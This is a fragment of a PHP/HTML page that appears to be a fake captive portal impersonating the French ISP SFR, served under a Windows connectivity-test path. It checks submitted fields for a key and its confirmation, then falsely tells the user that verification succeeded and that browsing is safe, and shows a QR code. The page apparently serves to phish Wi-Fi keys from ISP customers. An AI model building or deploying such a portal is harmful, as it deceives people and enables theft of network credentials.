...
<body>
<img src="/msftconnecttest/imgsfr/header_logo.ico" style="width: 180px">
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			...
			<p>
La v&eacute;rification a &eacute;t&eacute; correctement effectu&eacute;e vous pouvez reprendre la navigation internet en toute s&eacute;curit&eacute; avec votre box SFR en scannant le qr code ci-dessous avec vos équipements pour vous connecter.</p></p>
<br>
<br>
<img src="/msftconnecttest/imgsfr/qrcode.png">
<?php
                }
